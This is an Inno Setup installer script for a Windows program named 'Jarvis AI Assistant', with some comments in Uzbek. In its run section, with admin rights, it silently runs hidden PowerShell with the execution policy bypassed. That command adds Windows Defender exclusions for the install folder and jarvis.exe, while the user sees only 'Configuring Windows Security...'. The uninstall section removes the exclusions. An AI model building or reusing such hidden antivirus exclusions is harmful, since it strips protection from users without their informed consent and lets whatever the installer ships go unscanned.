[Setup]
AppName=Jarvis AI Assistant
AppVersion=1.0.0
AppPublisher=YourName
AppPublisherURL=https://github.com/yourusername
DefaultDirName={autopf}\Jarvis
DefaultGroupName=Jarvis
OutputDir=build
OutputBaseFilename=JarvisSetup
Compression=lzma2/ultra64
SolidCompression=yes
PrivilegesRequired=admin
SetupIconFile=assets\icon.ico
WizardStyle=modern

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "build\jarvis.exe"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
Name: "{group}\Jarvis AI"; Filename: "{app}\jarvis.exe"
Name: "{commondesktop}\Jarvis AI"; Filename: "{app}\jarvis.exe"

[Run]
; Defender exclusion - install paytida
Filename: "powershell.exe"; \
    Parameters: "-ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '{app}'; Add-MpPreference -ExclusionProcess 'jarvis.exe'"""; \
    Flags: runhidden waituntilterminated; \
    StatusMsg: "Configuring Windows Security..."

; App'ni ishga tushir
Filename: "{app}\jarvis.exe"; \
    Description: "Launch Jarvis AI"; \
    Flags: postinstall nowait skipifsilent

[UninstallRun]
; Uninstall paytida exclusion o'chir
Filename: "powershell.exe"; \
    Parameters: "-ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath '{app}'; Remove-MpPreference -ExclusionProcess 'jarvis.exe'"""; \
    Flags: runhidden waituntilterminated